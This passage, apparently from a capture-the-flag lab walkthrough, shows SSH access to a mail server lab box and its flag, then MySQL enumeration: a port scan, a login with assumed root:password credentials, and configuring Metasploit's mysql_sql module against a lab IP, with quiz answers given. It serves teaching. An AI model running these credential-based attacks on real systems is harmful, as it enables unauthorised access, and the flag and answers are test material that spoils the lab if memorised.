<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# ssh administrator@10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>The authenticity of host <span style="color:#a6e3a1">&#39;10.10.54.3 (10.10.54.3)&#39;</span> can<span style="color:#a6e3a1">&#39;t be established.
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#a6e3a1">ECDSA key fingerprint is SHA256:ABheODwYmk63/Mmp8cbMSoVTNv3vcgWbzukZoGMb62I.
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#a6e3a1">Are you sure you want to continue connecting (yes/no)? yes
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#a6e3a1">Warning: Permanently added &#39;</span>10.10.54.3<span style="color:#a6e3a1">&#39; (ECDSA) to the list of known hosts.
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#a6e3a1">administrator@10.10.54.3&#39;</span>s password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Welcome to Ubuntu 18.04.4 LTS <span style="color:#89dceb;font-weight:bold">(</span>GNU/Linux 4.15.0-111-generic x86_64<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>- Documentation: https://help.ubuntu.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>- Management: https://landscape.canonical.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>- Support: https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>System information as of Wed Jun <span style="color:#fab387">26</span> 03:31:06 UTC <span style="color:#fab387">2024</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>System load: 0.01 Processes: <span style="color:#fab387">91</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>Usage of /: 43.9% of 9.78GB Users logged in: <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>Memory usage: 15% IP address <span style="color:#cba6f7">for</span> eth0: 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>Swap usage: 0%
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span><span style="color:#fab387">87</span> packages can be updated.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span><span style="color:#fab387">35</span> updates are security updates.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>Last login: Wed Apr <span style="color:#fab387">22</span> 22:21:42 <span style="color:#fab387">2020</span> from 192.168.1.110
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>administrator@polosmtp:~$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>dead.letter Maildir smtp.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>administrator@polosmtp:~$ cat smtp.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>who_knew_email_servers_were_c00l?<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
<h3 id="mysql">MySQL</h3>
<hr>
<h4 id="understanding-mysql">Understanding MySQL</h4>
<p>MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL).</p>
<p>MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of MySQL databases.</p>
<ol>
<li>MySQL creates a database for storing and manipulating data, defining the relationship of each table.</li>
<li>Clients make requests by making specific statements in SQL.</li>
<li>The server will respond to the client with whatever information has been requested.</li>
</ol>
<br>
<p>What type of software is MySQL?</p>






<pre tabindex="0"><code>Relational Database Management System</code></pre>
<br>
What language is MySQL based on?






<pre tabindex="0"><code>SQL</code></pre>
<br>
<p>What communication model does MySQL use?</p>






<pre tabindex="0"><code>client-server</code></pre>
<br>
<p>What is a common application of MySQL?</p>






<pre tabindex="0"><code>back end database</code></pre>
<br>
<p>What major social network uses MySQL as their back-end database? This will require further research.</p>






<pre tabindex="0"><code>Facebook</code></pre>
<br>
<h4 id="enumerating-mysql">Enumerating MySQL</h4>
<p>Typically, you will have gained some initial credentials from enumerating other services that you can then use to enumerate and exploit the MySQL service. For the sake of the scenario, we&rsquo;re going to assume that we found the <code>credentials: &quot;root:password&quot;</code> while enumerating subdomains of a web server. After trying the login against SSH unsuccessfully, you decide to try it against MySQL.</p>
<br>
<p>As always, let&rsquo;s start out with a port scan, so we know what port the service we&rsquo;re trying to attack is running on. What port is MySQL using?</p>






<pre tabindex="0"><code>3306</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>PORT STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1</span></span></code></pre></div>
<br>
<p>Good, now  we think we have a set of credentials. Let&rsquo;s double check that by manually connecting to the MySQL server. We can do this using command <code>mysql -h [IP] -u [username] -p</code>.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# mysql -h 10.10.151.196 -u root -p
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Enter password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Welcome to the MySQL monitor. Commands end with ; or <span style="color:#89b4fa">\g</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Your MySQL connection id is <span style="color:#fab387">3</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Server version: 5.7.29-0ubuntu0.18.04.1 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Copyright <span style="color:#89dceb;font-weight:bold">(</span>c<span style="color:#89dceb;font-weight:bold">)</span> 2000, 2023, Oracle and/or its affiliates.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Oracle is a registered trademark of Oracle Corporation and/or its
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>affiliates. Other names may be trademarks of their respective
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>owners.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Type <span style="color:#a6e3a1">&#39;help;&#39;</span> or <span style="color:#a6e3a1">&#39;\h&#39;</span> <span style="color:#cba6f7">for</span> help. Type <span style="color:#a6e3a1">&#39;\c&#39;</span> to clear the current input statement.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>mysql&gt;</span></span></code></pre></div>
<br>
<p>Okay, we know that our login credentials work. Let&rsquo;s quit out of this session with &ldquo;exit&rdquo; and launch up Metasploit.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# msfconsole
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>This copy of metasploit-framework is more than two weeks old.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Consider running <span style="color:#a6e3a1">&#39;msfupdate&#39;</span> to update to the latest version.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>         .                                         .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>       <span style="color:#a6e3a1">&#39;   dB&#39;</span>                     BBP
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>    dB<span style="color:#a6e3a1">&#39;dB&#39;</span>dB<span style="color:#a6e3a1">&#39; dBBP     dBP     dBP BB
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#a6e3a1">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#a6e3a1">dB&#39;</span>dB<span style="color:#a6e3a1">&#39;dB&#39;</span> dBP dBP dBP BB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>dB<span style="color:#a6e3a1">&#39;dB&#39;</span>dB<span style="color:#a6e3a1">&#39; dBBBBP dBP dBBBBBBB
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#a6e3a1">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#a6e3a1">                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span><span style="color:#a6e3a1">          .                  .                  dB&#39;</span> dBP    dB<span style="color:#a6e3a1">&#39;.BP
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span><span style="color:#a6e3a1">                             |       dBP    dBBBB&#39;</span> dBP    dB<span style="color:#a6e3a1">&#39;.BP dBP    dBP
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span><span style="color:#a6e3a1">                           --o--    dBP    dBP    dBP    dB&#39;</span>.BP dBP    dBP
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>                                                                    .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>                .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>        o                  To boldly go where no
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>                            shell has gone <span style="color:#f5e0dc">before</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>       <span style="color:#89dceb;font-weight:bold">=[</span> metasploit v6.3.5-dev-                          <span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>- -- --<span style="color:#89dceb;font-weight:bold">=[</span> <span style="color:#fab387">2294</span> exploits - <span style="color:#fab387">1201</span> auxiliary - <span style="color:#fab387">410</span> post <span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>- -- --<span style="color:#89dceb;font-weight:bold">=[</span> <span style="color:#fab387">968</span> payloads - <span style="color:#fab387">45</span> encoders - <span style="color:#fab387">11</span> nops <span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>- -- --<span style="color:#89dceb;font-weight:bold">=[</span> <span style="color:#fab387">9</span> evasion <span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>Metasploit tip: Adapter names can be used <span style="color:#cba6f7">for</span> IP params
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span><span style="color:#89dceb">set</span> LHOST eth0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>Metasploit Documentation: https://docs.metasploit.com/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">38</span><span>msf6 &gt;</span></span></code></pre></div>
<br>
<p>We&rsquo;re going to be using the <code>mysql_sql</code> module.
Search for, select and list the options it needs. What three options do we need to set? (in descending order).</p>






<pre tabindex="0"><code>PASSWORD
RHOSTS
USERNAME</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 &gt; search mysql_sql
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#6c7086;font-style:italic"># Matching Modules</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#6c7086;font-style:italic"># Name Disclosure Date Rank Check Description</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#fab387">0</span> auxiliary/admin/mysql/mysql_sql normal No MySQL SQL Generic Query
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Interact with a module by name or index. For example info 0, use <span style="color:#fab387">0</span> or use auxiliary/admin/mysql/mysql_sql
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>msf6 &gt; use <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>PASSWORD no The password <span style="color:#cba6f7">for</span> the specified username
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>RHOSTS yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metaspl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>oit.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>RPORT <span style="color:#fab387">3306</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>SQL <span style="color:#cba6f7">select</span> version<span style="color:#89dceb;font-weight:bold">()</span> yes The SQL to execute.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>USERNAME no The username to authenticate as
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>View the full module info with the info, or info -d command.</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> USERNAME root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#f5e0dc">USERNAME</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> RHOSTS 10.10.151.196
